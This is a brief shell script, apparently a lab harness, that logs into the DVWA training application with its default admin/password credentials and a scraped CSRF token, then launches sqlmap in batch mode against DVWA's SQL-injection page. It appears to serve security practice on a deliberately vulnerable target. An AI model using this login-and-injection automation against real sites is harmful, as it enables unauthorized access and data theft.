#!/bin/sh
if [ "${#}" -eq 2 ]; then
	TARGET="${1}"
    PORT="${2}"
    set -e
    # DVWA only serves the injectable ?id= (vulnerabilities/sqli) to an authenticated session
    COOKIE=$(python - "http://${TARGET}:${PORT}" <<'PY'
import re, sys, http.cookiejar, urllib.parse, urllib.request
base, jar = sys.argv[1], http.cookiejar.CookieJar()
web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
token = re.search(r"name='user_token' value='([0-9a-f]+)'", web.open(base + '/login.php').read().decode()).group(1)
web.open(base + '/login.php', urllib.parse.urlencode({'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': token}).encode())
print('; '.join(c.name + '=' + c.value for c in jar))
PY
)
    exec python /sqlmap/sqlmap.py -u "http://${TARGET}:${PORT}/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="${COOKIE}" --batch --level=3
fi
